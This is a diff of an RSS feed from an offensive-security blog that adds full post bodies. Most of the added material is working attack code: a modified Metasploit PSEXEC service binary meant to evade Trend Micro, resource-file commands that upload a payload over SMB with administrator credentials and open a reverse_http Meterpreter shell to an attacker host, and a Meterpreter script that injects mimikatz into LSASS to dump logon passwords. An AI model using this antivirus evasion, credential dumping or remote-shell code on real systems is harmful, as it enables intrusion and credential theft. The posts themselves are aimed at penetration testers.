+&lt;p&gt;Let the fun begin&amp;hellip;&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -190,12 +741,187 @@ And as soon as you do you can start doing this (using the example resource file 
       <pubDate>Thu, 05 Jul 2012 03:44:59 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/</guid>
-      <description>@jabjorkhaug posed the following question on Twitter today:
-I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:
-The service binary that is used as part of PSEXEC is located here:
-MSF Directory/data/templates/src/pe/exe/service/service.c
-The important part to look at starts at line 57:
-#define WIN32_LEAN_AND_MEAN #include &amp;lt;windows.h&amp;gt; #define PAYLOAD_SIZE	8192 char cServiceName[32] = &amp;quot;SERVICENAME&amp;quot;; char bPayload[PAYLOAD_SIZE] = &amp;quot;PAYLOAD:&amp;quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.</description>
+      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jabjorkhaug&#34;&gt;@jabjorkhaug&lt;/a&gt; posed the following question on Twitter today:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_trendmicro_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201207_trendmicro_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The service binary that is used as part of PSEXEC is located here:&lt;/p&gt;
+
+&lt;p&gt;MSF Directory/data/templates/src/pe/exe/service/service.c&lt;/p&gt;
+
+&lt;p&gt;The important part to look at starts at line 57:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#define WIN32_LEAN_AND_MEAN
+#include &amp;lt;windows.h&amp;gt;
+
+#define PAYLOAD_SIZE	8192
+
+char cServiceName[32] = &amp;quot;SERVICENAME&amp;quot;;
+
+char bPayload[PAYLOAD_SIZE] = &amp;quot;PAYLOAD:&amp;quot;;
+
+SERVICE_STATUS ss;
+
+SERVICE_STATUS_HANDLE hStatus = NULL;
+
+/*
+ *
+ */
+BOOL ServiceHandler( DWORD dwControl )
+{
+	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
+	{
+		ss.dwWin32ExitCode = 0;
+		ss.dwCurrentState  = SERVICE_STOPPED;
+	}
+	return SetServiceStatus( hStatus, &amp;amp;ss );
+}
+
+/*
+ *
+ */
+VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
+{
+	CONTEXT Context;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	LPVOID lpPayload = NULL;
+
+	ZeroMemory( &amp;amp;ss, sizeof(SERVICE_STATUS) );
+	ZeroMemory( &amp;amp;si, sizeof(STARTUPINFO) );
+	ZeroMemory( &amp;amp;pi, sizeof(PROCESS_INFORMATION) );
+
+	si.cb = sizeof(STARTUPINFO);
+
+	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
+
+	ss.dwCurrentState = SERVICE_START_PENDING;
+
+	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
+
+	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
+  
+	if ( hStatus )
+	{
+		ss.dwCurrentState = SERVICE_RUNNING;
+
+		SetServiceStatus( hStatus, &amp;amp;ss );
+
+		if( CreateProcess( NULL, &amp;quot;rundll32.exe&amp;quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )
+		{
+			Context.ContextFlags = CONTEXT_FULL;
+		  
+			GetThreadContext( pi.hThread, &amp;amp;Context );
+		  
+			lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+			if( lpPayload )
+			{
+				WriteProcessMemory( pi.hProcess, lpPayload, &amp;amp;bPayload, PAYLOAD_SIZE, NULL );
+#ifdef _WIN64
+				Context.Rip = (DWORD64)lpPayload;
+#else
+				Context.Eip = (DWORD)lpPayload;
+#endif
+				SetThreadContext( pi.hThread, &amp;amp;Context );
+			}
+
+			ResumeThread( pi.hThread );
+			
+			CloseHandle( pi.hThread );
+		  
+			CloseHandle( pi.hProcess );
+		}
+		
+		ServiceHandler( SERVICE_CONTROL_STOP );
+		
+		ExitProcess( 0 );
+	}
+}
+
+/*
+ *
+ */
+int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
+{
+	SERVICE_TABLE_ENTRY st[] = 
+    { 
+        { (LPSTR)&amp;amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;amp;ServiceMain }, 
+        { NULL, NULL } 
+    };
+	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;amp;st );
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;
+
+&lt;p&gt;To make this change you replace the above with just this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;if( CreateProcess( NULL, &amp;quot;C:\evil.exe&amp;quot;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )
+{
+	CloseHandle( pi.hProcess );
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;i386-mingw32-gcc -o service.exe service.c 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then just copy it to replace the current one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cp service.exe ../../../../template_x86_windows_svc.exe 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&amp;rsquo;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload_file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, &lt;em&gt;remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;
+
+&lt;p&gt;Start Multi Handler&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 172.16.195.1
+set LPORT 80
+set ExitOnSession false
+exploit -j -z
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use auxiliary/admin/smb/upload_file
+set LPATH evil.exe
+set RPATH evil.exe
+set RHOST 172.16.195.155
+set SMBUser Administrator
+set SMBPass Password1234!
+run
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Execute PSEXEC using the new service binary that simply executes&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use exploit/windows/smb/psexec
+set RHOST 172.16.195.155
+set SMBUser Administrator
+set SMBPass Password1234!
+set DisablePayloadHandler true
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 172.16.195.1
+set LPORT 80
+exploit -j -z
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The passwords could have just as easily been hashes, and the end result is:&lt;/p&gt;
+
+&lt;p&gt;Well I can&amp;rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; [*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t!&lt;/p&gt;
+</description>
     </item>
     
     <item>
@@ -204,10 +930,89 @@ The important part to look at starts at line 57:
       <pubDate>Thu, 28 Jun 2012 13:18:52 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-06-28-netstat-post-module-for-meterpreter/</guid>
-      <description>Submitted it to MSF via pull request here: https://github.com/rapid7/metasploit-framework/pull/538
-Added to trunk: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb
-I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the GetTcpTable function to railgun:
-session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [ [&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;], [&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;], [&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;] ])  Then gauge the size of the table:</description>
+      <description>&lt;p&gt;Submitted it to MSF via pull request here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/538&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/538&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Added to trunk: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/tcpnetstat.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I promised this one a while ago, sorry for the delay. This only does TCP, it&amp;rsquo;d be trivial to do UDP as well but never really found anything interesting and actively going on on the UDP side. It&amp;rsquo;s real simple, first we&amp;rsquo;ve gotta add the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366026%28v=vs.85%29.aspx&#34;&gt;GetTcpTable&lt;/a&gt; function to railgun:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWORD&#39;, [
+	[&#39;PBLOB&#39;, &#39;pTcpTable&#39;, &#39;out&#39;],
+	[&#39;PDWORD&#39;, &#39;pdwSize&#39;, &#39;inout&#39;],
+	[&#39;BOOL&#39;, &#39;bOrder&#39;, &#39;in&#39;]
+])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then gauge the size of the table:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true)
+buffersize = getsize[&#39;pdwSize&#39;]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Run the call again with the correct buffer size:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then it&amp;rsquo;s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366917%28v=vs.85%29.aspx&#34;&gt;MIB_TCPTABLE&lt;/a&gt; one &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366909%28v=vs.85%29.aspx&#34;&gt;MIB_TCPROW&lt;/a&gt; at a time (translating the state to something readable):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def parse_tcptable(buffer)
+	entries = buffer[0,4].unpack(&amp;quot;V*&amp;quot;)[0]
+	print_status(&amp;quot;Total TCP Entries: #{entries}&amp;quot;)
+	rtable = Rex::Ui::Text::Table.new(
+		&#39;Header&#39; =&amp;gt; &#39;Routing Table&#39;,
+		&#39;Indent&#39; =&amp;gt; 2,
+		&#39;Columns&#39; =&amp;gt; [&#39;STATE&#39;, &#39;LHOST&#39;, &#39;LPORT&#39;, &#39;RHOST&#39;, &#39;RPORT&#39;]
+	)
+	offset = 4
+	(1..entries).each do
+		x = {}
+		x[:state] = case buffer[(offset + 0), 4].unpack(&amp;quot;V*&amp;quot;)[0]
+		when 1
+			&#39;CLOSED&#39;
+		when 2
+			&#39;LISTEN&#39;
+		when 3
+			&#39;SYN_SENT&#39;
+		when 4
+			&#39;SYN_RCVD&#39;
+		when 5
+			&#39;ESTABLISHED&#39;
+		when 6
+			&#39;FIN_WAIT1&#39;
+		when 7
+			&#39;FIN_WAIT2&#39;
+		when 8
+			&#39;CLOSE_WAIT&#39;
+		when 9
+			&#39;CLOSING&#39;
+		when 10
+			&#39;LAST_ACK&#39;
+		when 11
+			&#39;TIME_WAIT&#39;
+		when 12
+			&#39;DELETE_TCB&#39;
+		else
+			&#39;UNDEFINED&#39;
+		end
+		
+		x[:lhost] = Rex::Socket.addr_itoa(buffer[(offset + 4), 4].unpack(&amp;quot;N&amp;quot;)[0])
+		x[:lport] = buffer[(offset + 8), 4].unpack(&amp;quot;n&amp;quot;)[0]
+		x[:rhost] = Rex::Socket.addr_itoa(buffer[(offset + 12), 4].unpack(&amp;quot;N&amp;quot;)[0])
+		if x[:state] == &amp;quot;LISTEN&amp;quot;
+			x[:rport] = &amp;quot;_&amp;quot;
+		else
+			x[:rport] = buffer[(offset + 16), 4].unpack(&amp;quot;n&amp;quot;)[0]
+		end
+
+		offset = offset + 20
+		rtable &amp;lt;&amp;lt; [x[:state], x[:lhost], x[:lport], x[:rhost], x[:rport]]
+	end
+
+	print_status(rtable.to_s)
+end
+&lt;/code&gt;&lt;/pre&gt;
+</description>
     </item>
     
     <item>
@@ -216,8 +1021,88 @@ session.railgun.add_function(&#39;iphlpapi&#39;, &#39;GetTcpTable&#39;, &#39;DWO
       <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/</guid>
-      <description>One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
-Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.</description>
+      <description>&lt;p&gt;One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.&lt;/p&gt;
+
+&lt;p&gt;Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&amp;rsquo;ll get there in the subsequent posts.&lt;/p&gt;
+
+&lt;p&gt;Ignore the do_cmd for now and I stepped through &lt;a href=&#34;https://malicious.link/blog/2011/5/30/remote-dll-injection-with-meterpreter.html&#34;&gt;remote DLL injection here&lt;/a&gt;. So the first odd lines is &lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
+connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Essentially these connect to the &lt;a href=&#34;http://en.wikipedia.org/wiki/Named_pipe&#34;&gt;Named Pipe&lt;/a&gt; that the sekurlsa.dll uses to talk to the mimikatz.exe in it&amp;rsquo;s normal operation. Then we just use the windows API call &amp;ldquo;ReadFile&amp;rdquo; from there on out.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;One of the draw backs to doing this all remotely is that Railgun doesn&amp;rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&amp;rsquo;ve overcome this for the initial &amp;ldquo;banner&amp;rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &amp;ldquo;ping&amp;rdquo; and &amp;ldquo;getLogonPasswords&amp;rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)&lt;/p&gt;
+
+&lt;p&gt;If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!&lt;/p&gt;
+
+&lt;p&gt;Meterpreter Script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def do_cmd(handle,cmd)
+	ucommand = Rex::Text.to_unicode(cmd)
+	sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
+	good2go = false
+	newline = false
+	readstring = []
+	while good2go == false
+		# Have to pull data 1 unicode character at a time
+		# this is because the pipe won&#39;t write or read if
+		# too much was written or read by the &amp;quot;client&amp;quot; (us)
+		pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
+		# Check to see if our end of read check is there: n000 @00
+		if pull[&#39;lpBuffer&#39;] == &amp;quot;@00&amp;quot; and newline == true
+			good2go = true
+		else
+			readstring &amp;lt;&amp;lt; pull[&#39;lpBuffer&#39;]
+		end
+		
+		# Ready the newline var for previous check on next loop
+		if pull[&#39;lpBuffer&#39;] == &amp;quot;n00&amp;quot;
+			newline = true
+		else
+			newline = false
+		end
+	end
+	
+	print_status(readstring.join(&amp;quot;&amp;quot;))
+end
+
+print_status(&amp;quot;x86 Detected - Using x86 mimikatz&amp;quot;)
+handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\\\.\\pipe\\kiwi\\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
+print_status(&amp;quot;Handle: #{handle}&amp;quot;)
+framework.threads.spawn(&#39;injectlsass&#39;,false) {
+	pid = client.sys.process[&#39;lsass.exe&#39;]
+	print_status(&amp;quot;LSASS located at PID: #{pid}&amp;quot;)
+	pathtomimi = &amp;quot;C:\\sekurlsa.dll&amp;quot;
+
+	pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
+	pay.datastore[&amp;quot;DLL&amp;quot;] = pathtomimi
+	pay.datastore[&amp;quot;EXITFUNC&amp;quot;] = &#39;thread&#39;
+
+	raw = pay.generate
+	targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+	mem = targetprocess.memory.allocate(raw.length + (30024))
+	targetprocess.memory.write(mem, raw)
+	sleep(2)
+	targetprocess.thread.create(mem, 0)
+	print_status(&amp;quot;Successfully Injected into LSASS&amp;quot;)
+}
+print_status(&amp;quot;Waiting for LSASS injection to complete&amp;quot;)
+connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
+print_status(&amp;quot;Mimikatz has called home, ready for command&amp;quot;)
+sleep(2)
+print_status(&amp;quot;Reading banner&amp;quot;)
+client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
+print_status(&amp;quot;Doing a quick ping to make sure things are working...&amp;quot;)
+do_cmd(handle,&#39;ping&#39;)
+print_status(&amp;quot;If you made it this far it worked, doing getLogonPasswords&amp;quot;)
+do_cmd(handle, &#39;getLogonPasswords&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
     </item>
     
     <item>
@@ -226,336 +1111,67 @@ Here is my first step to that end; a railgun based Meterpreter script. Now befor
       <pubDate>Sun, 19 Feb 2012 05:57:02 +0000</pubDate>
       
       <guid>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</guid>
-      <description>I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target.</description>
-    </item>
-    
-    <item>
-      <title>MS08_068 &#43; MS10_046 = FUN UNTIL 2018</title>
-      <link>https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</link>
-      <pubDate>Sat, 11 Feb 2012 08:29:37 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2012/2012-02-11-ms08_068-ms10_046-fun-until-2018/</guid>
-      <description>*TL;DR:* SMB Relay + LNK UNC icons = internal pentest pwnage
-I need to touch on the highlights of two vulnerabilities before we talk about the fun stuff, but I highly encourage you to read the references at the bottom of this post and understand the vulnerabilities after you are done with my little trick, as you might find one of your own.
-MS08_068: http://www.cvedetails.com/cve/CVE-2008-4037/
-In 2008, Microsoft released MS08_068 which patched the &amp;ldquo;SMB Relay&amp;rdquo; attack.</description>
-    </item>
-    
-    <item>
-      <title>(UAC) User Assisted Compromise</title>
-      <link>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</link>
-      <pubDate>Tue, 03 Jan 2012 06:56:22 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</guid>
-      <description>A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At DerbyCon Chris Gates and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the ShellExecute windows function.aspx&amp;rdquo;) via Railgun with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:
-client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],]) client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)  This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;lsquo;evil.</description>
-    </item>
-    
-    <item>
-      <title>Run POST Modules On All Sessions</title>
-      <link>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</link>
-      <pubDate>Wed, 02 Nov 2011 03:06:18 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</guid>
-      <description>Jcran recently blogged about an easy way to run a post module on all sessions:
-http://blog.pentestify.com/simple-framework-domain-token-scanner
-msf&amp;gt; use post/windows/gather/enum_domain_tokens msf enum_domain_tokens&amp;gt; irb framework.sessions.each do |session| run_single(&amp;quot;set SESSION #{session.first}&amp;quot;) run_single(&amp;quot;run&amp;quot;) sleep 1 end  You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.</description>
-    </item>
-    
-    <item>
-      <title>MSFConsole Prompt Fiddling</title>
-      <link>https://malicious.link/post/2011/2011-10-09-msfconsole-prompt-fiddling/</link>
-      <pubDate>Sun, 09 Oct 2011 06:20:22 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-10-09-msfconsole-prompt-fiddling/</guid>
-      <description>In @carnal0wnage and my presentation at DerbyCon 2011 we talked about using SCREEN and SCRIPT to keep connections live / use them across SSH sessions, and log everything that happens. What we didn&amp;rsquo;t cover is the fact that there isn&amp;rsquo;t a time stamp for those logs. Now, Metasploit has multiple ways of creating logs:
- cat ~/.msf4/logs/framework.log  This log automatically logs all of the error data that is great for trouble shooting when something is working, but doesn&amp;rsquo;t record what you are doing inside of msfconsole  msf&amp;gt; spool ~/myclient.</description>
-    </item>
-    
-    <item>
-      <title>The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class</title>
-      <link>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</link>
-      <pubDate>Thu, 06 Oct 2011 15:53:11 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</guid>
-      <description>Video:  Slides: The Dirty Little Secrets They Didn&amp;rsquo;t Teach You In Pentesting Class [slideshare id=9530403]
-Code: https://github.com/mubix/Not-In-Pentesting-Class</description>
-    </item>
-    
-    <item>
-      <title>Metasploit Payloads Explained - Part 1b</title>
-      <link>https://malicious.link/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</link>
-      <pubDate>Sun, 17 Jul 2011 07:49:34 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</guid>
-      <description>This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (more info). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm).
-Here is the link to the ticket about the change (link) and the revision (r13057)</description>
-    </item>
-    
-    <item>
-      <title>Metasploit Payloads Explained - Part 1a</title>
-      <link>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</link>
-      <pubDate>Sun, 26 Jun 2011 17:47:23 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</guid>
-      <description>In Part 1 I gave an example I used at CCDC with the single &amp;lsquo;windows/download_exec&amp;rsquo;. One of the down sides of that payload is you need to host the binary, giving up an IP/host that can be blocked. Well, Google recently (a couple months ago) allowed people to upload &amp;lsquo;anything&amp;rsquo; to Google docs. And you can then share these files publicly. Probably already see where I&amp;rsquo;m going with this, but here are some steps to get it going, first upload your malicious binary (not the dropper &amp;lsquo;windows/download_exec&amp;rsquo;, but the file it needs to execute).</description>
-    </item>
-    
-    <item>
-      <title>Metasploit Payloads Explained - Part 1</title>
-      <link>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</link>
-      <pubDate>Sun, 26 Jun 2011 15:00:00 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</guid>
-      <description>Payload selection is something that rarely gets talked about in detail. Most PoCs just use calc.exe, netcat, or some kind of socket. The vast majority of Metasploit tutorials, videos and documentation use the _windows/meterpreter/reverse_tcp_ payload which is only one of 224 possible payloads. Here is a little disclaimer: While the payloads in Metasploit don&amp;rsquo;t get updated as much as other parts of Metasploit, this is a point in time documentation of them (June 23, 2011) and the payloads available in Metasploit are constantly changing.</description>
-    </item>
-    
-    <item>
-      <title>Remotely Suspend All Threads with Meterpreter</title>
-      <link>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</link>
-      <pubDate>Mon, 30 May 2011 21:52:59 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-05-30-remotely-suspend-all-threads-with-meterpreter/</guid>
-      <description>Just a follow up to my previous post. One of the things that sets that method apart is the fact that the suspension (once the DLL injection occurs) comes from within the process, and it suspends all the child processes as well.
-Another way you can do this without the injection is just sending a suspend to all the threads in the process.
-pid = 2980 targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS) targetprocess.</description>
-    </item>
-    
-    <item>
-      <title>Remote DLL Injection with Meterpreter</title>
-      <link>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
-      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
-      <description>Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: http://blog.didierstevens.com/2011/04/27/suspender-dll/
-Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well.</description>
-    </item>
-    
-    <item>
